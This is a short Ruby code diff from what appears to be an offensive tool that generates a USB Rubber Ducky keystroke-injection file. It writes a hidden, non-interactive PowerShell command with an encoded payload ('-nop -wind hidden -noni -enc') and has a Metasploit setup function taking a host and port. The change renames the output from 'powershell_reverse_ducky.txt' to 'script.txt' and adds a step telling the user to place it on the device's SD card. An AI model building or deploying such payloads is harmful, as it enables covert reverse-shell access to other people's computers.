@@ -157,10 +157,10 @@ def ducky_setup(encoded_command)
   s << "STRING powershell -nop -wind hidden -noni -enc \n"
   new_stream.each{ |x| s << "STRING #{x}\n"}
   s << 'ENTER'
-  File.open('powershell_reverse_ducky.txt', 'w') do |f|
+  File.open('script.txt', 'w') do |f|
     f.write(s)
   end
-  print_success("File Complete\n")
+  print_success("File Complete. Place script.txt file in sd card of rubber ducky.\n")
 end
 
 def metasploit_setup(msf_path, host, port)
